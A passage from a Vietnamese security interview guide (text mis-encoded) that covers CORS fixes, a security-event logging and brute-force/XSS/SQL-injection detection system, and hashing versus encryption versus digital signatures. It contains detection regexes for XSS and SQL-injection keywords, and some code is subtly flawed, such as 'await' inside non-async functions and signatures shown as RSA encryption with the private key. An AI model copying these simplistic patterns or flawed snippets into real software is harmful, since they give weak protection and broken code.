const JWT_SECRET = process.env.JWT_SECRET; // âœ… Äá»c tá»« env
const API_KEY = process.env.API_KEY;

// .gitignore pháº£i cÃ³ .env Ä‘á»ƒ khÃ´ng commit secrets

// âŒ Lá»–I 7: CORS wildcard trong production
// Váº¥n Ä‘á»: Cho phÃ©p má»i domain call API
app.use(cors({ origin: '*' })); // âŒ Má»i domain Ä‘á»u gá»i Ä‘Æ°á»£c

// âœ… CÃCH Sá»¬A: Whitelist domains cá»¥ thá»ƒ
app.use(
  cors({
    origin: ['https://yourdomain.com', 'https://app.yourdomain.com'], // âœ… Chá»‰ cho phÃ©p domains nÃ y
    credentials: true,
  })
);
```

**Monitoring & Logging (GiÃ¡m SÃ¡t & Ghi Log Báº£o Máº­t):**

```typescript
// âœ… Security Event Logging System
// Má»¥c Ä‘Ã­ch: PhÃ¡t hiá»‡n vÃ  theo dÃµi cÃ¡c hoáº¡t Ä‘á»™ng báº¥t thÆ°á»ng

import winston from 'winston'; // ThÆ° viá»‡n logging máº¡nh máº½

// Cáº¥u hÃ¬nh logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    // Ghi vÃ o file
    new winston.transports.File({ filename: 'security.log' }),
    // Gá»­i Ä‘áº¿n service giÃ¡m sÃ¡t (VD: Elasticsearch, Datadog)
    new winston.transports.Http({ host: 'logs.example.com' }),
  ],
});

// 1. Log Failed Login Attempts (Láº§n Thá»­ Login Tháº¥t Báº¡i)
// PhÃ¡t hiá»‡n brute-force attack
function logFailedLogin(email: string, ip: string, timestamp: Date) {
  securityLogger.warn({
    event: 'FAILED_LOGIN',
    email,
    ip,
    timestamp,
    message: `Thá»­ login tháº¥t báº¡i: ${email} tá»« IP ${ip}`,
  });

  // Kiá»ƒm tra sá»‘ láº§n thá»­ tháº¥t báº¡i
  const failedAttempts = await getFailedAttempts(ip, email);

  if (failedAttempts >= 5) {
    securityLogger.error({
      event: 'BRUTE_FORCE_DETECTED',
      email,
      ip,
      attempts: failedAttempts,
      message: `âš ï¸ PhÃ¡t hiá»‡n brute-force: ${failedAttempts} láº§n thá»­ tá»« ${ip}`,
    });

    // Block IP táº¡m thá»i
    await blockIP(ip, 3600); // Block 1 giá»

    // Gá»­i alert cho security team
    await sendAlert('security@example.com', `Brute-force detected: ${ip}`);
  }
}

// 2. Log Suspicious Activity (Hoáº¡t Äá»™ng ÄÃ¡ng Ngá»)
// VD: User truy cáº­p nhiá»u accounts, transfer sá»‘ tiá»n báº¥t thÆ°á»ng
function logSuspiciousActivity(userId: string, action: string, details: any) {
  securityLogger.warn({
    event: 'SUSPICIOUS_ACTIVITY',
    userId,
    action,
    details,
    timestamp: new Date(),
    message: `Hoáº¡t Ä‘á»™ng Ä‘Ã¡ng ngá»: User ${userId} - ${action}`,
  });

  // VD: Transfer sá»‘ tiá»n lá»›n báº¥t thÆ°á»ng
  if (action === 'LARGE_TRANSFER' && details.amount > 100000) {
    // Gá»­i OTP xÃ¡c nháº­n
    await sendOTP(userId);

    // Alert security team
    await sendAlert(
      'security@example.com',
      `Large transfer detected: User ${userId} - $${details.amount}`
    );
  }
}

// 3. Log XSS Attempts (Thá»­ Táº¥n CÃ´ng XSS)
// PhÃ¡t hiá»‡n khi user nháº­p script tags hoáº·c malicious code
function logXSSAttempt(input: string, ip: string, userId?: string) {
  // Detect script tags hoáº·c javascript: protocol
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;

  if (xssPattern.test(input)) {
    securityLogger.error({
      event: 'XSS_ATTEMPT',
      ip,
      userId: userId || 'anonymous',
      input: input.substring(0, 200), // Chá»‰ log 200 kÃ½ tá»± Ä‘áº§u
      timestamp: new Date(),
      message: `âš ï¸ PhÃ¡t hiá»‡n XSS attempt tá»« IP ${ip}`,
    });

    // Block IP ngay láº­p tá»©c
    await blockIP(ip, 86400); // Block 24 giá»

    // Alert admin
    await sendAlert(
      'admin@example.com',
      `XSS attempt from ${ip}: ${input.substring(0, 100)}...`
    );
  }
}

// 4. Log SQL Injection Attempts
function logSQLInjectionAttempt(query: string, ip: string) {
  const sqlPattern = /(\bOR\b|\bAND\b).*=.*|UNION|DROP|DELETE|INSERT/i;

  if (sqlPattern.test(query)) {
    securityLogger.error({
      event: 'SQL_INJECTION_ATTEMPT',
      ip,
      query: query.substring(0, 200),
      timestamp: new Date(),
      message: `âš ï¸ SQL injection attempt tá»« ${ip}`,
    });

    await blockIP(ip, 86400);
  }
}

// 5. Log Authentication Events
function logAuthEvent(
  event: string,
  userId: string,
  ip: string,
  success: boolean
) {
  securityLogger.info({
    event: 'AUTH_EVENT',
    type: event, // 'LOGIN', 'LOGOUT', 'TOKEN_REFRESH', 'PASSWORD_CHANGE'
    userId,
    ip,
    success,
    timestamp: new Date(),
    message: `${event}: User ${userId} tá»« ${ip} - ${
      success ? 'ThÃ nh cÃ´ng' : 'Tháº¥t báº¡i'
    }`,
  });
}

// 6. Real-time Monitoring Dashboard
// Hiá»ƒn thá»‹ logs real-time cho security team
import { Server } from 'socket.io';

const io = new Server(server);

// Gá»­i security events real-time Ä‘áº¿n dashboard
securityLogger.on('data', (logEntry) => {
  if (logEntry.level === 'error' || logEntry.level === 'warn') {
    // Emit Ä‘áº¿n security dashboard
    io.to('security-room').emit('security-alert', logEntry);
  }
});

// Dashboard component (React)
function SecurityDashboard() {
  const [alerts, setAlerts] = useState<any[]>([]);

  useEffect(() => {
    const socket = io('wss://your-server.com');
    socket.emit('join', 'security-room');

    socket.on('security-alert', (alert) => {
      setAlerts((prev) => [alert, ...prev].slice(0, 100)); // Keep 100 alerts

      // Play sound for critical alerts
      if (
        alert.event === 'BRUTE_FORCE_DETECTED' ||
        alert.event === 'XSS_ATTEMPT'
      ) {
        playAlertSound();
      }
    });

    return () => socket.disconnect();
  }, []);

  return (
    <div className="security-dashboard">
      <h2>ğŸ›¡ï¸ Security Monitoring Dashboard</h2>
      {alerts.map((alert, i) => (
        <div key={i} className={`alert alert-${alert.level}`}>
          <span className="time">{alert.timestamp}</span>
          <span className="event">{alert.event}</span>
          <span className="message">{alert.message}</span>
        </div>
      ))}
    </div>
  );
}

// ğŸ“Š METRICS TRACKING (Theo dÃµi chá»‰ sá»‘)
interface SecurityMetrics {
  totalRequests: number;
  failedLogins: number;
  xssAttempts: number;
  sqlInjectionAttempts: number;
  blockedIPs: number;
}

// Track metrics theo thá»i gian
const metrics: SecurityMetrics = {
  totalRequests: 0,
  failedLogins: 0,
  xssAttempts: 0,
  sqlInjectionAttempts: 0,
  blockedIPs: 0,
};

// Gá»­i metrics Ä‘áº¿n monitoring service (VD: Prometheus, Grafana)
setInterval(() => {
  sendMetrics('security.metrics', metrics);
  console.log('ğŸ“Š Security Metrics:', metrics);
}, 60000); // Má»—i phÃºt
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”‘ Q52: Hashing, Encryption & Digital Signatures - PhÃ¢n Biá»‡t & á»¨ng Dá»¥ng Thá»±c Táº¿</span></summary>


**â“ CÃ¢u Há»i:**
PhÃ¢n biá»‡t Hashing, Encryption vÃ  Digital Signature. Khi nÃ o dÃ¹ng tá»«ng loáº¡i? Giáº£i thÃ­ch cÆ¡ cháº¿ hoáº¡t Ä‘á»™ng vÃ  vÃ­ dá»¥ thá»±c táº¿ vá»›i bcrypt, AES, RSA, JWT signing.



#### **ğŸ“Š So SÃ¡nh Tá»•ng Quan: Hash vs Encryption vs Digital Signature**

| TiÃªu ChÃ­            | **Hashing**                    | **Encryption**                     | **Digital Signature**               |
| ------------------- | ------------------------------ | ---------------------------------- | ----------------------------------- |
| **CÆ¡ Cháº¿**          | One-way (khÃ´ng Ä‘áº£o ngÆ°á»£c)      | Two-way (mÃ£ hÃ³a â†” giáº£i mÃ£)         | Sign & Verify (kÃ½ & xÃ¡c thá»±c)       |
| **Má»¥c ÄÃ­ch**        | Verify integrity, checksum     | Protect confidentiality            | Verify authenticity & integrity     |
| **Reversible?**     | âŒ KHÃ”NG (cannot decrypt)      | âœ… CÃ“ (with key)                   | âœ… CÃ“ (verify only, not decrypt)    |
| **Input â†’ Output**  | Báº¥t ká»³ Ä‘á»™ dÃ i â†’ Fixed length   | Báº¥t ká»³ Ä‘á»™ dÃ i â†’ Variable ciphertext | Data â†’ Signature                   |
| **Key Required?**   | âŒ KHÃ”NG (salt optional)       | âœ… CÃ“ (symmetric/asymmetric)       | âœ… CÃ“ (private key sign, public verify) |
| **Use Cases**       | Password storage, checksums    | Data encryption, HTTPS             | JWT tokens, API authentication      |
| **Algorithms**      | bcrypt, SHA-256, MD5 (legacy)  | AES, RSA, ChaCha20                 | RSA, ECDSA, EdDSA                   |
| **Performance**     | Slow (bcrypt: 10 rounds)       | Fast (AES: hardware accelerated)   | Medium (RSA slower than ECDSA)      |

---

#### **ğŸ” CÆ¡ Cháº¿ Hoáº¡t Äá»™ng Chi Tiáº¿t**

TrÆ°á»›c khi Ä‘i vÃ o code, hÃ£y hiá»ƒu rÃµ **CÆ  CHáº¾** hoáº¡t Ä‘á»™ng cá»§a tá»«ng loáº¡i Ä‘á»ƒ biáº¿t **KHI NÃ€O** dÃ¹ng **CÃI GÃŒ**.

---

#### **ğŸ” A. HASHING - HÃ m BÄƒm Má»™t Chiá»u**

**ğŸ“Œ CÆ¡ Cháº¿ Hoáº¡t Äá»™ng:**

```
INPUT (báº¥t ká»³ Ä‘á»™ dÃ i) â†’ HASH FUNCTION â†’ OUTPUT (fixed length)

"password123"     â†’  bcrypt  â†’  "$2b$10$N9qo8uLO..."  (60 chars)
"myfile.pdf"      â†’  SHA-256 â†’  "e3b0c44298fc1c..." (64 hex chars)
"Hello World"     â†’  SHA-256 â†’  "a591a6d40bf420..." (64 hex chars)
```

**ğŸ”‘ Äáº·c Äiá»ƒm Quan Trá»ng:**

1. **One-Way (Má»™t chiá»u)**: 
   - âœ… CÃ³ thá»ƒ: Password â†’ Hash
   - âŒ KHÃ”NG thá»ƒ: Hash â†’ Password
   - LÃ½ do: Hash function loáº¡i bá» thÃ´ng tin (many-to-one mapping)

2. **Deterministic (Cá»‘ Ä‘á»‹nh)**:
   ```typescript
   hash("password123") === hash("password123")  // âœ… LuÃ´n giá»‘ng nhau
   ```

3. **Avalanche Effect (Hiá»‡u á»©ng tuyáº¿t lá»Ÿ)**:
   ```typescript
   hash("password123")  â†’ "e3b0c44298fc1c..."
   hash("password124")  â†’ "92cf3b8ec0a8d7..."  // HoÃ n toÃ n khÃ¡c!
   // Chá»‰ thay Ä‘á»•i 1 kÃ½ tá»± â†’ hash hoÃ n toÃ n khÃ¡c
   ```

4. **Fixed Output Length (Äá»™ dÃ i cá»‘ Ä‘á»‹nh)**:
   ```typescript
   hash("Hi")           â†’ 64 hex chars (SHA-256)
   hash("Very long...") â†’ 64 hex chars (SHA-256)
   // Input báº¥t ká»³ â†’ output luÃ´n 64 chars
   ```

**ğŸ¯ Táº¡i Sao DÃ¹ng cho Passwords?**

```typescript
// âŒ Váº¤N Äá»€: LÆ°u plaintext password
Database: { email: "user@example.com", password: "mypassword123" }
// Náº¿u hacker hack database â†’ biáº¿t ngay password!

// âœ… GIáº¢I PHÃP: Hash password
Database: { email: "user@example.com", password: "$2b$10$N9qo8uLO..." }
// Hacker chá»‰ tháº¥y hash, KHÃ”NG thá»ƒ reverse vá» password!

// KHI LOGIN:
const userInput = "mypassword123";
const storedHash = "$2b$10$N9qo8uLO...";

// So sÃ¡nh: hash(userInput) === storedHash?
const isValid = bcrypt.compare(userInput, storedHash);  // âœ… true náº¿u Ä‘Ãºng
```

**ğŸ’¡ Salt - NgÄƒn Rainbow Table Attack:**

```typescript
// âŒ KHÃ”NG DÃ™NG SALT:
hash("password123") â†’ "e3b0c44298fc1c..."  // LuÃ´n giá»‘ng nhau
// Hacker táº¡o Rainbow Table (báº£ng hash sáºµn cá»§a triá»‡u passwords phá»• biáº¿n)
// Tra ngÆ°á»£c: "e3b0c44298fc1c..." â†’ "password123"  âœ… TÃ¬m Ä‘Æ°á»£c!

// âœ… DÃ™NG SALT:
hash("password123" + "randomSalt1") â†’ "$2b$10$abc..."
hash("password123" + "randomSalt2") â†’ "$2b$10$xyz..."
// Má»—i user cÃ³ salt khÃ¡c nhau â†’ cÃ¹ng password cÅ©ng khÃ¡c hash
// Rainbow Table KHÃ”NG dÃ¹ng Ä‘Æ°á»£c! (vÃ¬ pháº£i táº¡o báº£ng cho má»—i salt)
```

---

#### **ğŸ” B. ENCRYPTION - MÃ£ HÃ³a Hai Chiá»u**

CÃ³ 2 loáº¡i: **Symmetric** (Äá»‘i xá»©ng) vÃ  **Asymmetric** (Báº¥t Ä‘á»‘i xá»©ng).

---

#### **ğŸ” B.1. SYMMETRIC ENCRYPTION - MÃ£ HÃ³a Äá»‘i Xá»©ng (1 Key)**

**ğŸ“Œ CÆ¡ Cháº¿ Hoáº¡t Äá»™ng:**

```
PLAINTEXT + KEY â†’ [ENCRYPT] â†’ CIPHERTEXT
CIPHERTEXT + KEY â†’ [DECRYPT] â†’ PLAINTEXT

VÃ­ dá»¥:
"Hello World" + key123 â†’ [AES Encrypt] â†’ "6Kq8z3Xp..."
"6Kq8z3Xp..." + key123 â†’ [AES Decrypt] â†’ "Hello World"
```

**ğŸ”‘ Äáº·c Äiá»ƒm:**
- **1 key duy nháº¥t**: DÃ¹ng cho cáº£ encrypt VÃ€ decrypt
- **Fast**: AES-256 ráº¥t nhanh (hardware accelerated)
- **Problem**: LÃ m sao gá»­i key an toÃ n cho receiver?

**ğŸ¯ VÃ­ Dá»¥ Thá»±c Táº¿ - Alice gá»­i message cho Bob:**

```typescript
// ALICE (Sender):
const message = "Meet me at 3pm";
const secretKey = "shared-secret-key-123";  // âš ï¸ Alice vÃ  Bob Ä‘á»u biáº¿t key nÃ y

const encrypted = AES.encrypt(message, secretKey);  // "6Kq8z3Xp..."
// Alice gá»­i encrypted message cho Bob

// BOB (Receiver):
const received = "6Kq8z3Xp...";
const secretKey = "shared-secret-key-123";  // âš ï¸ Bob pháº£i cÃ³ CÃ™NG key

const decrypted = AES.decrypt(received, secretKey);  // "Meet me at 3pm"
console.log(decrypted);  // âœ… Bob Ä‘á»c Ä‘Æ°á»£c message
```

**âš ï¸ Váº¤N Äá»€: Key Distribution Problem**

```
Alice vÃ  Bob cÃ¡ch nhau 1000km, lÃ m sao chia sáº» secretKey an toÃ n?
- Gá»­i qua email? âŒ Email cÃ³ thá»ƒ bá»‹ intercept
- Gá»­i qua SMS? âŒ SMS khÃ´ng mÃ£ hÃ³a
- NÃ³i Ä‘iá»‡n thoáº¡i? âŒ Äiá»‡n thoáº¡i cÃ³ thá»ƒ bá»‹ nghe lÃ©n

â†’ Giáº£i phÃ¡p: DÃ¹ng ASYMMETRIC ENCRYPTION Ä‘á»ƒ trao Ä‘á»•i symmetric key!
```

**ğŸ¯ Use Cases:**
- **Database Encryption**: Encrypt PII (email, phone, SSN)
- **File Encryption**: Encrypt files trÆ°á»›c khi upload cloud
- **HTTPS Data**: Sau khi handshake, dÃ¹ng AES encrypt data
- **Disk Encryption**: BitLocker, FileVault dÃ¹ng AES

**ğŸ’¡ Táº¡i Sao HTTPS DÃ¹ng AES (KhÃ´ng DÃ¹ng RSA)?**

```
AES-256:  Encrypt 1GB file trong ~1 giÃ¢y
RSA-2048: Encrypt 1GB file trong ~10 phÃºt!

â†’ HTTPS flow:
1. Handshake: DÃ¹ng RSA trao Ä‘á»•i AES key (chá»‰ ~32 bytes)
2. Data Transfer: DÃ¹ng AES encrypt data (nhanh!)
```

---

#### **ğŸ” B.2. ASYMMETRIC ENCRYPTION - MÃ£ HÃ³a Báº¥t Äá»‘i Xá»©ng (2 Keys)**

**ğŸ“Œ CÆ¡ Cháº¿ Hoáº¡t Äá»™ng:**

```
2 KEYS: Public Key (cÃ´ng khai) + Private Key (bÃ­ máº­t)

ENCRYPT vá»›i PUBLIC KEY â†’ Decrypt vá»›i PRIVATE KEY
PLAINTEXT + Public Key  â†’ [ENCRYPT] â†’ CIPHERTEXT
CIPHERTEXT + Private Key â†’ [DECRYPT] â†’ PLAINTEXT
```

**ğŸ”‘ Äáº·c Äiá»ƒm:**
- **2 keys khÃ¡c nhau**: Public (share freely) + Private (keep secret)
- **Math Magic**: Dá»±a trÃªn sá»‘ há»c (factorization, discrete logarithm)
- **Slow**: RSA cháº­m hÆ¡n AES 10-100x

**ğŸ¯ VÃ­ Dá»¥ Thá»±c Táº¿ - Alice gá»­i message cho Bob:**

```typescript
// BOB táº¡o key pair:
const bobKeys = generateRSAKeyPair();
// bobKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share freely)
// bobKeys.privateKey = "-----BEGIN PRIVATE KEY-----..." (Keep secret!)

// Bob gá»­i PUBLIC KEY cho Alice (qua email, website, anywhere)
// âš ï¸ Public key KHÃ”NG sá»£ bá»‹ lá»™! Ai cÅ©ng biáº¿t Ä‘Æ°á»£c!

// ALICE (Sender):
const message = "Meet me at 3pm";
const encrypted = RSA.encrypt(message, bobKeys.publicKey);  // DÃ¹ng Bob's PUBLIC KEY
// encrypted = "f8Kq3z..."

// âš ï¸ Chá»‰ Bob má»›i decrypt Ä‘Æ°á»£c (vÃ¬ chá»‰ Bob cÃ³ PRIVATE KEY)
// Alice KHÃ”NG thá»ƒ decrypt (dÃ¹ Alice lÃ  ngÆ°á»i encrypt!)

// BOB (Receiver):
const decrypted = RSA.decrypt(encrypted, bobKeys.privateKey);  // DÃ¹ng Bob's PRIVATE KEY
console.log(decrypted);  // "Meet me at 3pm" âœ…
```

**ğŸ’¡ Giáº£i Quyáº¿t Key Distribution Problem:**

```
Alice muá»‘n gá»­i message cho Bob:

CÃCH CÅ¨ (Symmetric):
1. Alice vÃ  Bob pháº£i gáº·p nhau Ä‘á»ƒ trao Ä‘á»•i secret key  âŒ KhÃ´ng tiá»‡n
2. Hoáº·c gá»­i key qua kÃªnh khÃ´ng an toÃ n  âŒ Nguy hiá»ƒm

CÃCH Má»šI (Asymmetric):
1. Bob táº¡o key pair (public + private)
2. Bob share public key lÃªn website/email (KHÃ”NG sá»£ lá»™!)
3. Alice láº¥y Bob's public key
4. Alice encrypt message vá»›i Bob's public key
5. Gá»­i encrypted message cho Bob
6. Bob decrypt vá»›i private key (chá»‰ Bob cÃ³!)

âœ… KHÃ”NG cáº§n gáº·p nhau!
âœ… KHÃ”NG cáº§n trao Ä‘á»•i secret key!
âœ… Public key bá»‹ lá»™ cÅ©ng KHÃ”NG sao!
```

**ğŸ¯ Use Cases:**
- **HTTPS Handshake**: Server gá»­i public key, client encrypt AES key
- **SSH Authentication**: Client cÃ³ private key, server cÃ³ public key
- **PGP Email**: Encrypt email vá»›i recipient's public key
- **Digital Signatures**: Sign vá»›i private key, verify vá»›i public key (Ä‘áº£o ngÆ°á»£c!)

**ğŸ” Public Key vs Private Key - Ai DÃ¹ng CÃ¡i GÃ¬?**

```typescript
// ENCRYPTION (MÃ£ hÃ³a - Protect Confidentiality):
Sender   encrypt vá»›i RECEIVER's PUBLIC KEY
Receiver decrypt vá»›i RECEIVER's PRIVATE KEY

VÃ­ dá»¥: Alice gá»­i message cho Bob
Alice:  encrypt(message, Bob's PUBLIC KEY)   â†’ ciphertext
Bob:    decrypt(ciphertext, Bob's PRIVATE KEY) â†’ message

// DIGITAL SIGNATURE (Chá»¯ kÃ½ sá»‘ - Prove Authenticity):
Signer  sign vá»›i SIGNER's PRIVATE KEY
Verifier verify vá»›i SIGNER's PUBLIC KEY

VÃ­ dá»¥: Alice kÃ½ document
Alice:  sign(document, Alice's PRIVATE KEY)   â†’ signature
Bob:    verify(document, signature, Alice's PUBLIC KEY) â†’ âœ… valid
```

---

#### **ğŸ” C. DIGITAL SIGNATURE - Chá»¯ KÃ½ Sá»‘**

**ğŸ“Œ CÆ¡ Cháº¿ Hoáº¡t Äá»™ng:**

```
SIGN (KÃ½):
1. Hash document vá»›i SHA-256 â†’ hash
2. Encrypt hash vá»›i PRIVATE KEY â†’ signature
3. Gá»­i document + signature

VERIFY (XÃ¡c thá»±c):
1. Hash received document â†’ hash1
2. Decrypt signature vá»›i PUBLIC KEY â†’ hash2
3. Compare hash1 === hash2 ?
   - âœ… Match â†’ Document valid, khÃ´ng bá»‹ tamper
   - âŒ Not match â†’ Document bá»‹ thay Ä‘á»•i hoáº·c signature giáº£
```

**ğŸ”‘ Äáº·c Äiá»ƒm:**
- **Prove Authenticity**: Chá»©ng minh document tá»« Ä‘Ãºng ngÆ°á»i (chá»‰ há» cÃ³ private key)
- **Prove Integrity**: Chá»©ng minh document khÃ´ng bá»‹ thay Ä‘á»•i (hash khá»›p)
- **Non-repudiation**: Signer khÃ´ng thá»ƒ chá»‘i bá» Ä‘Ã£ kÃ½ (vÃ¬ chá»‰ há» cÃ³ private key)

**ğŸ¯ VÃ­ Dá»¥ Thá»±c Táº¿ - Alice KÃ½ Contract:**

```typescript
// ALICE táº¡o key pair:
const aliceKeys = generateRSAKeyPair();
// aliceKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share)
// aliceKeys.privateKey = "-----BEGIN PRIVATE KEY-----..." (Secret)

// ALICE KÃ CONTRACT:
const contract = "I agree to pay $10000 to Bob";

// BÆ°á»›c 1: Hash contract
const hash = SHA256(contract);  // "e3b0c44298fc1c..."

// BÆ°á»›c 2: Encrypt hash vá»›i PRIVATE KEY
const signature = RSA.encrypt(hash, aliceKeys.privateKey);  // "f8Kq3z..."

// Alice gá»­i cho Bob: contract + signature + Alice's public key

// BOB VERIFY SIGNATURE:
const receivedContract = "I agree to pay $10000 to Bob";
const receivedSignature = "f8Kq3z...";
const alicePublicKey = "-----BEGIN PUBLIC KEY-----...";

// BÆ°á»›c 1: Hash received contract
const hash1 = SHA256(receivedContract);  // "e3b0c44298fc1c..."

// BÆ°á»›c 2: Decrypt signature vá»›i PUBLIC KEY
const hash2 = RSA.decrypt(receivedSignature, alicePublicKey);  // "e3b0c44298fc1c..."

// BÆ°á»›c 3: Compare
if (hash1 === hash2) {
  console.log("âœ… Signature valid!");
  console.log("âœ… Contract tá»« Alice (vÃ¬ chá»‰ Alice cÃ³ private key)");
  console.log("âœ… Contract khÃ´ng bá»‹ thay Ä‘á»•i (vÃ¬ hash khá»›p)");
} else {
  console.log("âŒ Signature invalid!");
  console.log("âŒ Contract bá»‹ tamper hoáº·c signature giáº£!");
}
```

**ğŸ’¡ Táº¡i Sao KHÃ”NG Encrypt ToÃ n Bá»™ Document?**

```
RSA SLOW:
- Sign toÃ n bá»™ contract (10 pages) â†’ 10 giÃ¢y
- Sign hash cá»§a contract (64 chars)  â†’ 0.01 giÃ¢y

Hash UNIQUE:
- 2 documents khÃ¡c nhau â†’ 2 hashes khÃ¡c nhau
- 1 document thay Ä‘á»•i 1 kÃ½ tá»± â†’ hash hoÃ n toÃ n khÃ¡c
â†’ Verify hash = verify toÃ n bá»™ document!
```

**ğŸ¯ Use Cases:**
- **JWT Tokens**: Server sign JWT vá»›i private key, client verify vá»›i public key
- **Code Signing**: Software developers sign apps (macOS, Windows)
- **SSL Certificates**: Certificate Authority (CA) sign certificates
- **Blockchain**: Sign transactions vá»›i private key
- **Email (PGP)**: Sign emails Ä‘á»ƒ prove authenticity

**ğŸ” Digital Signature vs Encryption - KhÃ¡c Nhau Tháº¿ NÃ o?**

```typescript
// ENCRYPTION (MÃ£ hÃ³a):
Má»¥c Ä‘Ã­ch: Protect CONFIDENTIALITY (báº£o máº­t)
Encrypt vá»›i: RECEIVER's PUBLIC KEY
Decrypt vá»›i: RECEIVER's PRIVATE KEY
Result: Chá»‰ receiver Ä‘á»c Ä‘Æ°á»£c message

VÃ­ dá»¥: Alice gá»­i secret message cho Bob
Alice:  encrypt(message, Bob's PUBLIC)    â†’ Bob decrypt vá»›i Bob's PRIVATE
        â†‘ DÃ¹ng Bob's keys!

// DIGITAL SIGNATURE (Chá»¯ kÃ½ sá»‘):
Má»¥c Ä‘Ã­ch: Prove AUTHENTICITY & INTEGRITY (xÃ¡c thá»±c & toÃ n váº¹n)
Sign vá»›i: SIGNER's PRIVATE KEY
Verify vá»›i: SIGNER's PUBLIC KEY
Result: Má»i ngÆ°á»i verify Ä‘Æ°á»£c message tá»« signer

VÃ­ dá»¥: Alice kÃ½ contract
Alice:  sign(contract, Alice's PRIVATE)   â†’ Bob verify vá»›i Alice's PUBLIC
        â†‘ DÃ¹ng Alice's keys!
```

**ğŸ¯ JWT Example - Káº¿t Há»£p Cáº£ Hai:**

```typescript
// SERVER (Sign JWT):
const payload = { userId: "123", role: "admin" };
const privateKey = "-----BEGIN PRIVATE KEY-----...";

// Hash payload + sign vá»›i PRIVATE KEY
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });
// "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMifQ.signature"

// CLIENT/API (Verify JWT):
const publicKey = "-----BEGIN PUBLIC KEY-----...";

try {
  const verified = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
  console.log("âœ… Token valid:", verified);
  // âœ… Token tá»« server (vÃ¬ chá»‰ server cÃ³ private key)
  // âœ… Payload khÃ´ng bá»‹ thay Ä‘á»•i (vÃ¬ signature valid)
} catch (error) {
  console.log("âŒ Token invalid:", error.message);
  // âŒ Token bá»‹ tamper hoáº·c signature giáº£
}
```

**ğŸ’¡ Táº¡i Sao JWT DÃ¹ng RS256 (KhÃ´ng DÃ¹ng HS256)?**

```typescript
// HS256 (HMAC with SHA-256):
- Symmetric: 1 secret key (server giá»¯)
- Sign: HMAC(payload, secret)
- Verify: HMAC(payload, secret)
âš ï¸ Váº¤N Äá»€: Client KHÃ”NG verify Ä‘Æ°á»£c (khÃ´ng cÃ³ secret key)
âš ï¸ Náº¿u client cÃ³ secret â†’ client cÃ³ thá»ƒ forge tokens!

// RS256 (RSA with SHA-256):
- Asymmetric: Private key (server) + Public key (share)
- Sign: RSA(hash(payload), privateKey)
- Verify: RSA(signature, publicKey)
âœ… Client verify Ä‘Æ°á»£c (cÃ³ public key)
âœ… Client KHÃ”NG thá»ƒ forge tokens (khÃ´ng cÃ³ private key)
âœ… Microservices verify Ä‘Æ°á»£c (share public key)
```

---

#### **ğŸ“š TÃ³m Táº¯t CÆ¡ Cháº¿:**

| Loáº¡i                | Keys               | Operation                      | Use Case                          |
| ------------------- | ------------------ | ------------------------------ | --------------------------------- |
| **Hashing**         | âŒ No key          | Input â†’ Hash (one-way)         | Passwords, checksums              |
| **Symmetric Encrypt** | 1 key (shared)    | Encrypt/Decrypt (same key)     | Database encryption, HTTPS data   |
| **Asymmetric Encrypt** | 2 keys (pub+priv) | Encrypt (pub), Decrypt (priv)  | HTTPS handshake, PGP email        |
| **Digital Signature** | 2 keys (pub+priv) | Sign (priv), Verify (pub)      | JWT, code signing, blockchain     |

---

#### **1ï¸âƒ£ HASHING - One-Way Function (HÃ m Má»™t Chiá»u)**

**ğŸ”‘ Äáº·c Äiá»ƒm:**
- **One-way**: Input â†’ Hash, KHÃ”NG thá»ƒ Hash â†’ Input
- **Deterministic**: CÃ¹ng input â†’ cÃ¹ng hash
- **Fixed length**: SHA-256 luÃ´n 64 hex chars (256 bits)
- **Avalanche effect**: Thay Ä‘á»•i 1 bit input â†’ hoÃ n toÃ n khÃ¡c hash

**ğŸ“Œ Use Cases:**
1. **Password Storage**: Never store plaintext passwords
2. **Data Integrity**: Verify files khÃ´ng bá»‹ thay Ä‘á»•i (checksums)
3. **Unique Identifiers**: Generate tokens, session IDs
4. **Blockchain**: Bitcoin sá»­ dá»¥ng SHA-256

---

**ğŸ” 1.1. Password Hashing vá»›i bcrypt**

```typescript
import bcrypt from 'bcrypt';

// =====================================
// PASSWORD HASHING WITH BCRYPT
// =====================================

// ğŸ”¹ REGISTER - Hash password khi user Ä‘Äƒng kÃ½
async function registerUser(email: string, password: string) {
  // Salt rounds = Ä‘á»™ phá»©c táº¡p (10 = 2^10 = 1024 iterations)
  // CÃ ng cao cÃ ng secure nhÆ°ng cÃ ng cháº­m
  const saltRounds = 10;
  
  // bcrypt tá»± Ä‘á»™ng generate salt vÃ  combine vá»›i hash
  const hashedPassword = await bcrypt.hash(password, saltRounds);
  
  // LÆ°u vÃ o database
  await db.users.create({
    email,
    password: hashedPassword, // VD: $2b$10$Xu... (60 chars)
  });
  
  console.log('Original:', password);          // "MySecurePass123"
  console.log('Hashed:', hashedPassword);      // "$2b$10$Xu4K..."
  // âš ï¸ KhÃ´ng thá»ƒ reverse tá»« hash vá» password!
}

// ğŸ”¹ LOGIN - Verify password khi user Ä‘Äƒng nháº­p
async function loginUser(email: string, password: string) {
  // Láº¥y user tá»« database
  const user = await db.users.findByEmail(email);
  
  if (!user) {
    throw new Error('User not found');
  }
  
  // So sÃ¡nh password vá»›i hash (bcrypt.compare tá»± extract salt)
  const isValid = await bcrypt.compare(password, user.password);
  
  if (!isValid) {
    throw new Error('Invalid password');
  }
  
  // Generate JWT token náº¿u password Ä‘Ãºng
  const token = generateJWT(user.id);
  return { user, token };
}

// ğŸ”¹ CHANGE PASSWORD - Hash láº¡i khi user Ä‘á»•i máº­t kháº©u
async function changePassword(userId: string, oldPassword: string, newPassword: string) {
  const user = await db.users.findById(userId);
  
  // Verify old password
  const isValid = await bcrypt.compare(oldPassword, user.password);
  if (!isValid) {
    throw new Error('Old password is incorrect');
  }
  
  // Hash new password
  const newHashedPassword = await bcrypt.hash(newPassword, 10);
  
  // Update database
  await db.users.update(userId, {
    password: newHashedPassword,
    passwordChangedAt: new Date(),
  });
}
```

**ğŸ’¡ Giáº£i ThÃ­ch:**
- **bcrypt format**: `$2b$10$salt(22 chars)hash(31 chars)` (total 60 chars)
  - `$2b$` = bcrypt algorithm version
